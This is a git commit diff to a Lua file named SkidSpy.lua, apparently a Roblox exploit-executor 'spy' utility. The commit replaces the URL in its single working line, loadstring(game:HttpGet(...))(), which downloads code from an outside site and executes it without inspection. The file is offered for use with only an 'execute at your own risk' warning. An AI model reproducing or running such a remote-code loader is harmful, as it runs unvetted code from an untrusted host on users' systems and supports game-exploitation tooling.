5baf86fdcf7df089d3559a1d758404e0dabf9bed
CookieCrumble <168351007+CookieCrumble2@users.noreply.github.com>
2025-07-25 15:13:56 -0400

    Update SkidSpy.lua

--- Utilities/SkidSpy.lua
+++ Utilities/SkidSpy.lua
@@ -3,4 +3,4 @@ This Spy is in v1 and should not be tampered with
 Execute at your own risk!
 ]]--
 --[[ In monochrome we trust ]]--
-loadstring(game:HttpGet("https://p.decrypted.cloud/r/e9gt2H2a4NAwcQapR5Yobu"))()
+loadstring(game:HttpGet("https://scriptorium.wtf/r/whoiscookie"))()
